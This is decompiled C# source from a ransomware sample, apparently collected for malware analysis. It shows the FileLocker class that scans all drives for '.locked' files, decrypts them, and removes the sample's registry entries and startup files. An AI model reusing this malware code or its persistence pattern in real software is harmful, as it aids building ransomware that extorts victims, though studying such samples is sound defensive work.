// Decompiled with JetBrains decompiler
// Type: FileLocker.SearchEncodedFiles
// Assembly: FileLocker, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4E5EE51A-6914-4180-A10A-8B6B85AFF127
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan-Ransom.Win32.Blocker.ibjo-459a487b0ad80fc56c06fca73eb80b3268bd423eaf6da5a1b400a7b5c19fb957.exe

using FileLocker.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace FileLocker
{
  public class SearchEncodedFiles
  {
    public string Dossiersystem;

    public SearchEncodedFiles()
    {
      Class0.SLV0fFIsptsZtjvFft17();
      // ISSUE: explicit constructor call
      base.\u002Ector();
      this.Dossiersystem = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
    }

    public void ChercherFichiers(DirectoryInfo directoryInfo_0, string[] string_0)
    {
      try
      {
        string[] strArray = string_0;
        int num = 0;
        while (num < strArray.Length)
        {
          FileInfo[] files = directoryInfo_0.GetFiles("*.*");
          int index = 0;
          while (index < files.Length)
          {
            FileInfo fileInfo = files[index];
            if (!fileInfo.FullName.StartsWith(Conversions.ToString(this.Dossiersystem[0]) + ":\\Windows") && fileInfo.FullName.EndsWith(".locked"))
              DecodeFiles.Decode_File(fileInfo.FullName);
            checked { ++index; }
          }
          checked { ++num; }
        }
        DirectoryInfo[] directories = directoryInfo_0.GetDirectories();
        int index1 = 0;
        while (index1 < directories.Length)
        {
          this.ChercherFichiers(directories[index1], string_0);
          checked { ++index1; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoOptimization)]
    public void method_0()
    {
      DriveInfo[] drives = DriveInfo.GetDrives();
      int index = 0;
      while (index < drives.Length)
      {
        DriveInfo driveInfo = drives[index];
        if (driveInfo.IsReady)
          this.ChercherFichiers(new DirectoryInfo(driveInfo.RootDirectory.ToString()), new string[5]
          {
            "JPG",
            "BMP",
            "PNG",
            "MP4",
            "AVI"
          });
        checked { ++index; }
      }
      try
      {
        KeyRegistration.RegDelete();
        KeyRegistration.DeleteFois();
        MyProject.Forms.Form1.Description.Stop();
        File.Delete(MyProject.Forms.Form1.FichierDesktop);
        File.Delete(MyProject.Forms.Form1.FichierStartup);
        File.Delete(Application.ExecutablePath + ".locked");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      int num = (int) Interaction.MsgBox((object) "Tous vos fichiers en été decrypté avec succéss !", MsgBoxStyle.Information);
      ProjectData.EndApp();
    }
  }
}
